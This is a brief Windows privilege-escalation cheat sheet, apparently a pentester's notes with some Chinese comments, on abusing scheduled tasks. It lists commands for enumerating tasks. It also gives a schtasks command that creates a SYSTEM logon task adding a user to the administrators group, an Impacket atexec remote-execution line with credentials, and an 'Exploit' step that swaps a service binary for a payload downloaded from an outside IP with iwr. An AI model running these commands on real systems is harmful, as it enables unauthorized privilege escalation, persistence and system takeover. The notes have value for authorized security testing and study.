- Run as User: admin/System?
- triggers: When/How to run? Reboot? a minute?
- approach: Path/Binary/dll
### schtasks
```powershell
Get-ScheduledTask
schtasks /query /fo LIST /v    #/fo LIST 列表输出; /v verbose
schtasks /query /tn {$taskname} /fo list /v 

schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
### Check task Details
```powershell
schtasks /query /tn {$taskname} /fo list /v   #计划任务详情
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe #check binary
```
### Impacket -- Domain
```bash
python3 atexec.py Domain/Administrator:<Password>@123@172.21.0.0 systeminfo
```
# Exploit
## Replace Binary
```powershell
ren <services_binary> <services_binary> .old
iwr -Uri http://192.168.119.3/payload -Outfile <services_binary>
```
